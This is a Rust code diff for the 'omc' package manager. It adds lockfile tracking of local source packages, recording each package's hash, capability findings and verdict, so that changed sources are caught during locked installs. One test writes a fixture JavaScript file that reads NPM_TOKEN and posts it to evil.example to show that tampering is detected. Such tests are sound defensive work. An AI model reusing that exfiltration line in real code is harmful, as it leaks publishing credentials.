@@ -417,6 +417,8 @@ pub struct OmcLock {
     #[serde(default)]
     pub packages: Vec<LockedPackage>,
     #[serde(default)]
+    pub local_sources: Vec<LockedLocalSource>,
+    #[serde(default)]
     pub python_vcs: Vec<LockedPythonVcsDependency>,
 }
 
@@ -425,6 +427,7 @@ impl OmcLock {
         Self {
             version: 1,
             packages: Vec::new(),
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         }
     }
@@ -453,6 +456,16 @@ impl OmcLock {
                     ))
             });
         }
+    }
+
+    fn replace_local_sources(&mut self, mut sources: Vec<LockedLocalSource>) {
+        sources.sort_by(|left, right| {
+            locked_local_source_sort_key(left).cmp(&locked_local_source_sort_key(right))
+        });
+        sources.dedup_by(|left, right| {
+            locked_local_source_request_key(left) == locked_local_source_request_key(right)
+        });
+        self.local_sources = sources;
     }
 
     fn replace_python_vcs(&mut self, mut dependencies: Vec<LockedPythonVcsDependency>) {
@@ -495,6 +508,25 @@ pub struct LockedPackage {
     pub optional_dependencies: Vec<String>,
     #[serde(default)]
     pub peer_dependencies: Vec<String>,
+    #[serde(default)]
+    pub grants: Vec<String>,
+    #[serde(default)]
+    pub capabilities: Vec<CapabilityFinding>,
+    #[serde(default)]
+    pub verifier_findings: Vec<String>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct LockedLocalSource {
+    pub ecosystem: Ecosystem,
+    pub name: String,
+    pub version: String,
+    pub source_url: String,
+    pub source_path: String,
+    pub artifact: String,
+    pub sha256: String,
+    pub behavior: Behavior,
+    pub verdict: Verdict,
     #[serde(default)]
     pub grants: Vec<String>,
     #[serde(default)]
@@ -1369,7 +1401,7 @@ pub fn install_project(options: &LinkOptions) -> Result<InstallReport> {
     let mut options = options.clone();
     lock_project_options(&mut options)?;
     let lock = read_lockfile(options.project_dir.join(LOCKFILE))?;
-    let local_source_artifacts = compile_local_source_artifacts(&options)?;
+    let local_source_artifacts = compile_local_source_artifacts(&options, false)?;
     let mut report = install_lock_with_python_target(
         &options.project_dir,
         &lock,
@@ -1437,7 +1469,7 @@ pub fn install_locked_project(options: &LinkOptions) -> Result<InstallReport> {
     selected
         .packages
         .retain(|package| retained.contains(&locked_package_key(package)));
-    let local_source_artifacts = compile_local_source_artifacts(&options)?;
+    let local_source_artifacts = compile_local_source_artifacts(&options, true)?;
 
     let mut report = install_lock_with_python_target(
         &options.project_dir,
@@ -1485,7 +1517,7 @@ struct LocalSourceCompileInput {
     version: String,
 }
 
-fn compile_local_source_artifacts(options: &LinkOptions) -> Result<usize> {
+fn compile_local_source_artifacts(options: &LinkOptions, locked: bool) -> Result<usize> {
     let mut inputs = npm_local_source_compile_inputs(
         &options.project_dir,
         &options.npm_local_paths,
@@ -1496,7 +1528,10 @@ fn compile_local_source_artifacts(options: &LinkOptions) -> Result<usize> {
     )?);
 
     let mut count = 0;
+    let mut locked_sources = Vec::new();
     let mut seen = BTreeSet::new();
+    let canonical_project_dir =
+        fs::canonicalize(&options.project_dir).unwrap_or_else(|_| options.project_dir.clone());
     for input in inputs {
         let key = format!(
             "{}:{}@{}:{}",
@@ -1533,10 +1568,102 @@ fn compile_local_source_artifacts(options: &LinkOptions) -> Result<usize> {
                 ),
             });
         }
+        let artifact_path = report.artifact_path.as_ref().ok_or_else(|| {
+            OmcRegistryError::UnsupportedInstallArtifact(format!(
+                "local source artifact for {}:{}@{} was not stored",
+                input.ecosystem, input.name, input.version
+            ))
+        })?;
+        let canonical_artifact_path =
+            fs::canonicalize(artifact_path).unwrap_or_else(|_| artifact_path.clone());
+        locked_sources.push(LockedLocalSource {
+            ecosystem: input.ecosystem,
+            name: input.name,
+            version: input.version,
+            source_url: report.artifact.source_url.clone(),
+            source_path: relative_path(&canonical_project_dir, &input.source_path),
+            artifact: relative_path(&canonical_project_dir, &canonical_artifact_path),
+            sha256: report.artifact.source_sha256.clone(),
+            behavior: report.artifact.behavior,
+            verdict: report.artifact.verdict,
+            grants: report.artifact.grants.clone(),
+            capabilities: report.artifact.capabilities.clone(),
+            verifier_findings: report.artifact.verifier_findings.clone(),
+        });
         count += 1;
     }
+    sync_local_source_lockfile(&options.project_dir, locked_sources, locked)?;
 
     Ok(count)
+}
+
+fn sync_local_source_lockfile(
+    project_dir: &Path,
+    sources: Vec<LockedLocalSource>,
+    locked: bool,
+) -> Result<()> {
+    let lockfile = project_dir.join(LOCKFILE);
+    let mut lock = read_lockfile(&lockfile)?;
+    if locked {
+        validate_locked_local_sources(&lock, &sources)?;
+        return Ok(());
+    }
+
+    lock.replace_local_sources(sources);
+    fs::write(lockfile, toml::to_string_pretty(&lock)?)?;
+    Ok(())
+}
+
+fn validate_locked_local_sources(lock: &OmcLock, sources: &[LockedLocalSource]) -> Result<()> {
+    for source in sources {
+        let key = locked_local_source_request_key(source);
+        let Some(locked) = lock
+            .local_sources
+            .iter()
+            .find(|locked| locked_local_source_request_key(locked) == key)
+        else {
+            return Err(OmcRegistryError::LockfileOutOfDate(format!(
+                "{}:{} local source `{}`",
+                source.ecosystem, source.name, source.source_path
+            )));
+        };
+        if locked.version != source.version
+            || locked.sha256 != source.sha256
+            || locked.artifact != source.artifact
+            || locked.behavior != source.behavior
+            || locked.verdict != source.verdict
+            || locked.grants != source.grants
+            || locked.capabilities != source.capabilities
+            || locked.verifier_findings != source.verifier_findings
+        {
+            return Err(OmcRegistryError::LockfileOutOfDate(format!(
+                "{}:{} local source `{}`",
+                source.ecosystem, source.name, source.source_path
+            )));
+        }
+    }
+    Ok(())
+}
+
+fn locked_local_source_request_key(source: &LockedLocalSource) -> (Ecosystem, String, String) {
+    let name = match source.ecosystem {
+        Ecosystem::Npm => source.name.clone(),
+        Ecosystem::Pypi => normalize_pypi_name(&source.name),
+    };
+    (source.ecosystem, name, source.source_path.clone())
+}
+
+fn locked_local_source_sort_key(
+    source: &LockedLocalSource,
+) -> (Ecosystem, String, String, String, String) {
+    let (ecosystem, name, source_path) = locked_local_source_request_key(source);
+    (
+        ecosystem,
+        name,
+        source_path,
+        source.version.clone(),
+        source.sha256.clone(),
+    )
 }
 
 fn npm_local_source_compile_inputs(
@@ -19021,6 +19148,22 @@ mod tests {
         assert!(artifact.capabilities.iter().any(|finding| {
             finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
         }));
+        let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
+        assert_eq!(lock.local_sources.len(), 1);
+        assert_eq!(lock.local_sources[0].name, "local-pkg");
+        assert_eq!(lock.local_sources[0].version, "1.2.3");
+        assert_eq!(lock.local_sources[0].sha256, artifact.source_sha256);
+
+        install_locked_project(&options).unwrap();
+        fs::write(
+            local.join("index.js"),
+            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/changed', { body: token });\n",
+        )
+        .unwrap();
+        let error = install_locked_project(&options).unwrap_err();
+        assert!(error
+            .to_string()
+            .contains("omc.lock does not satisfy `npm:local-pkg local source"));
     }
 
     #[test]
@@ -19232,6 +19375,12 @@ version = "0.2.0"
         assert_eq!(artifact.package.name, "local-py");
         assert_eq!(artifact.package.version, "0.2.0");
         assert_eq!(artifact.verdict, Verdict::Accepted);
+        let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
+        assert_eq!(lock.local_sources.len(), 1);
+        assert_eq!(lock.local_sources[0].ecosystem, Ecosystem::Pypi);
+        assert_eq!(lock.local_sources[0].name, "local-py");
+        assert_eq!(lock.local_sources[0].version, "0.2.0");
+        assert_eq!(lock.local_sources[0].sha256, artifact.source_sha256);
     }
 
     #[test]
@@ -20084,6 +20233,7 @@ packages:
             toml::to_string_pretty(&OmcLock {
                 version: 1,
                 packages: vec![locked.clone()],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             })
             .unwrap(),
@@ -20116,6 +20266,7 @@ packages:
             toml::to_string_pretty(&OmcLock {
                 version: 1,
                 packages: vec![locked],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             })
             .unwrap(),
@@ -20195,6 +20346,7 @@ packages:
             toml::to_string_pretty(&OmcLock {
                 version: 1,
                 packages: vec![keep.clone(), stale],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             })
             .unwrap(),
@@ -20229,6 +20381,7 @@ packages:
                     stale_pypi,
                     unrelated.clone(),
                 ],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             })
             .unwrap(),
@@ -20267,6 +20420,7 @@ packages:
             toml::to_string_pretty(&OmcLock {
                 version: 1,
                 packages: vec![keep, remove],
+                local_sources: Vec::new(),
                 python_vcs: vec![LockedPythonVcsDependency {
                     name: "requests".to_owned(),
                     url: "https://example.invalid/requests.git".to_owned(),
@@ -20301,6 +20455,7 @@ packages:
             toml::to_string_pretty(&OmcLock {
                 version: 1,
                 packages: Vec::new(),
+                local_sources: Vec::new(),
                 python_vcs: vec![LockedPythonVcsDependency {
                     name: "gitpkg".to_owned(),
                     url: "https://example.invalid/gitpkg.git".to_owned(),
@@ -20334,6 +20489,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![root, dep],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
 
@@ -20361,6 +20517,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![root, dep],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
         assert!(check_pypi_lock(&lock).is_empty());
@@ -20417,6 +20574,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![root, dependency],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
         let options = LinkOptions::new(".");
@@ -20439,6 +20597,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![root, dependency],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
         let mut options = LinkOptions::new(".");
@@ -20462,6 +20621,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![root],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
         let options = LinkOptions::new(".");
@@ -20490,6 +20650,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![root, runtime, optional, peer],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
         let mut options = LinkOptions::new(".");
@@ -20514,6 +20675,7 @@ packages:
         let lock = OmcLock {
             version: 1,
             packages: vec![locked_package_for_test(Ecosystem::Npm, "left-pad", "1.1.0")],
+            local_sources: Vec::new(),
             python_vcs: Vec::new(),
         };
         let options = LinkOptions::new(".");
@@ -21046,6 +21208,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
         )
@@ -21107,6 +21270,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
             Some(&target),
@@ -21181,6 +21345,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![old_package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
             Some(&target),
@@ -21193,6 +21358,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![new_package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
             Some(&target),
@@ -21271,6 +21437,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![old_package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
             Some(&target),
@@ -21286,6 +21453,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![new_package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
             Some(&target),
@@ -21342,6 +21510,7 @@ print("hi")
             &OmcLock {
                 version: 1,
                 packages: vec![package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
         )
@@ -27640,6 +27809,7 @@ wheels = [
             &OmcLock {
                 version: 1,
                 packages: vec![package],
+                local_sources: Vec::new(),
                 python_vcs: Vec::new(),
             },
         )
